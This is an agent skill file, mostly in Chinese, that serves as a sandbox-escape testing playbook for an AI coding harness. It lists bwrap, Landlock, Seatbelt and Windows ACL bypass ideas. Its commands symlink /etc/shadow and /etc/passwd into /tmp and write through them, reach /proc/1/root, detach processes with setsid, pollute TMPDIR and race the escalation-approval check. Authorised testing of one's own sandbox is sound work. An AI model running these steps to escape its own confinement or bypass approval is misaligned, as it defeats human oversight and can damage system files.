---
name: dsh-sandbox-escape
description: >-
  Sandbox escape playbook for DeepSeek Harness. Use when testing the process-confinement
  seam, bwrap/Landlock/Seatbelt backends, Windows ACL restricted tokens, and the
  sandbox_permissions escalation pathway.
---

# DeepSeek Harness Sandbox Escape Playbook

> **授权前提**: 仅对自己拥有的 DeepSeek Harness 部署执行测试

## 攻击面架构

```
Sandbox Seam (packages/sandbox/sandbox/src/index.ts)
├── LocalSandboxProvider (packages/sandbox/sandbox-local/src/index.ts:250)
│   ├── Linux: bwrap → Landlock  (PLATFORM_CHAINS at index.ts:159)
│   ├── macOS:  Seatbelt (sandbox-exec)
│   └── Windows: ACL restricted-token runner (packages/sandbox/sandbox-windows-acl)
├── Escalation (packages/sandbox/sandbox/src/escalation.ts:28)
│   └── WIDER_MODES = {read-only → [workspace-write, danger-full-access]}
└── File Roots (packages/sandbox/sandbox/src/roots.ts:52)
    └── writableRoots = [workspaceRoot, /tmp, os.tmpdir()]
```

## 1. 沙箱提升绕过 (Escalation Bypass)

### 1.1 非法 Widening 检查绕过 (packages/sandbox/sandbox/src/escalation.ts:162)

```typescript
// 检查点: approveEscalation() 在索引 ts:157
// WIDER_MODES[effectiveMode] — effectiveMode 来自 session/policy 解析
// 攻击: 伪造 effectiveMode 绕过 widening 检查

// 场景 1: 模式混淆
sandbox_permissions: "workspace-write"  // effective mode 被污染为 "read-only" → 合法 widening
// 但实际运行在 danger-full-access 下

// 场景 2: 审批竞态
// 在 approveEscalation 完成前注入第二个请求
// 利用: approveEscalation 返回 Promise, signal 竞争
const controller = new AbortController();
// 并发发送两个提升请求 — 第二个可能在第一个完成前通过审核
```

### 1.2 schema 验证绕过 (packages/shell/tool-bash/src/index.ts:250)

```typescript
// 关键: sandbox_permissions 是 schema-advertised key
// 但 "schema-advertised without a sandboxing executor" 仍可达执行
// packages/shell/tool-bash/src/index.ts:209: "unadvertised sandbox_permissions still reaches execute"

# 测试: 在无沙箱组合下发送 sandbox_permissions
# 应被拒绝: packages/sandbox/sandbox/src/escalation.ts:165-167
```

## 2. bwrap 逃逸 (Linux)

### 2.1 /tmp 挂载绕过 (packages/sandbox/sandbox-local/src/profiles.ts:16)

```bash
# bwrap profile: --ro-bind / / --dev /dev --proc /proc --die-with-parent
# workspace-write 模式附加: --tmpfs /tmp --bind <workspace> <workspace>

# 攻击 1: /tmp symlink 到受限路径
ln -s /etc/shadow /tmp/pwned
cat /tmp/pwned  # bwrap --ro-bind / / 应该阻止 — 但测试符号链接解析

# 攻击 2: /proc/self 挂载转义
bwrap --ro-bind / / --proc /proc -- /bin/bash -c '
  # 通过 /proc/1/root 访问原始文件系统
  ls /proc/1/root/etc/shadow
  # 通过 /proc/self/fd 继承文件描述符
  ls -la /proc/self/fd/
'

# 攻击 3: mount namespace 逃逸
bwrap --ro-bind / / --unshare-all -- /bin/bash -c '
  mount -t tmpfs none /tmp  # 尝试重新挂载
  # bwrap 默认不传递 CAP_SYS_ADMIN，但测试边界
'
```

### 2.2 --die-with-parent 绕过

```bash
# bwrap --die-with-parent 依赖 ptrace 来检测父进程死亡
# 攻击: 杀死父进程的 ptrace 监听器
bwrap --ro-bind / / --die-with-parent -- /bin/bash -c '
  # 在子进程中 fork，使父进程无法被清洁终止
  # 利用: --die-with-parent 使用 prctl(PR_SET_PDEATHSIG) — 仅对信号传递有效
  # 如果父进程被信号杀死但子进程进入新会话，可能存活
  setsid sleep 999 &
'
```

## 3. Landlock 绕过 (Linux)

### 3.1 ABI 版本探测 (packages/sandbox/sandbox-local/src/index.ts:233)

```bash
# Landlock launcher 自检: packages/sandbox/sandbox-local/src/index.ts:233-237
# 老内核 ABI 返回: "partial enforcement"
# 攻击: 强制使用老版 Landlock ABI — 跳过规则

# 通过 DSH_SANDBOX_LOCAL 环境或配置绕过探测
# packages/sandbox/sandbox-local/src/index.ts:114: internals 接口允许替换 probe
```

### 3.2 规则绕过

```bash
# Landlock 规则基于文件路径解析 — 符号链接、硬链接可能绕过
# writableRoots 来自: packages/sandbox/sandbox/src/roots.ts:52
# /tmp 和 os.tmpdir() 始终可写 — 在 workspace-write 模式下

# 攻击: 通过 /tmp 链
ln -s /etc/passwd /tmp/escaped
echo "hijacked" > /tmp/escaped  # 写入受限路径

# 攻击: tmpdir() 污染
export TMPDIR=/etc  # os.tmpdir() 可能返回污染值
```

## 4. Seatbelt 逃逸 (macOS)

### 4.1 SBPL 规则分析 (packages/sandbox/sandbox-local/src/profiles.ts:38)

```bash
# Seatbelt profile 来自 packages/sandbox/sandbox-local/src/profiles.ts:51
# 关键规则: (deny file-write*) 除 /dev/null 和 writable roots
# writableRoots: packages/sandbox/sandbox/src/roots.ts:52

# 攻击 1: 符号链接
ln -s /etc/passwd /tmp/pwned
# Seatbelt 使用 canonical path — 但 realpath 可能存在竞态

# 攻击 2: /dev/null write trick
cat > /dev/null/etc/shadow  # 路径遍历在 SBPL literal 中

# 攻击 3: 沙盒外部路径
# SBPL literal 字符串匹配 — 测试 Unicode 规范化绕过
```

## 5. Windows ACL 绕过

### 5.1 硬链接攻击 (packages/sandbox/sandbox/src/roots.ts:51)

```powershell
# 已知边界: packages/sandbox/sandbox-windows-acl/src/index.ts:23-29
# "NTFS hard links can alias one file object across paths"

# 攻击 1: 硬链接到受限文件
# workspace-write SID: packages/sandbox/sandbox-windows-acl/src/workspace-sid.ts:35
# 确定性从 workspace path 派生 — 同工作区同 SID

mklink /H "C:\temp\dsh-shared\link.txt" "C:\workspace\secret.txt"
# 在同一 workspace 下，共享的 workspaceWriteSid 可能允许访问

# 攻击 2: 确定性 SID 预测
# workspaceWriteSid = S-1-4-{sha256(workspace)[0] % (2^30-1)+1}-{sha256(workspace)[4] % (2^30-1)+1}
# 攻击者可以预测同 workspace 的 SID，创建具有该 SID 的令牌

# 攻击 3: tempWriteSid 碰撞
# tempWriteSid = S-1-4-{hash}--1 (第三个子授权固定为 1)
# 随机 temp dir → 随机 SID，但第三子授权固定
```

### 5.2 WRITE_RESTRICTED 边界 (packages/sandbox/sandbox/src/roots.ts:185)

```
# 已知缺陷: packages/sandbox/sandbox-local/src/index.ts:185
# "WRITE_RESTRICTED must retain Everyone in its restricting list"
# → Everyone 组在 restricting SID 列表中
# → 具有 Everyone 成员关系的进程可能绕过写限制

# 攻击: 通过 Everyone 组成员资格绕过
```

### 5.3 Console Isolation 缺陷

```
# 已知: packages/sandbox/sandbox-windows-acl/src/index.ts:27-28
# "console isolation is unavailable — children share the host console"
# 攻击: 通过共享控制台注入输入
```

## 6. 验证清单

- [ ] bwrap: `/proc/self/fd` 继承测试
- [ ] bwrap: `--die-with-parent` 绕过 (setsid)
- [ ] Landlock: `TMPDIR` 环境污染测试
- [ ] Seatbelt: 符号链接竞态测试
- [ ] Windows ACL: 硬链接别名攻击
- [ ] Windows ACL: 确定性 SID 预测
- [ ] 审批竞态: 并发沙箱提升请求
- [ ] schema 绕过: 无沙箱执行器下的 sandbox_permissions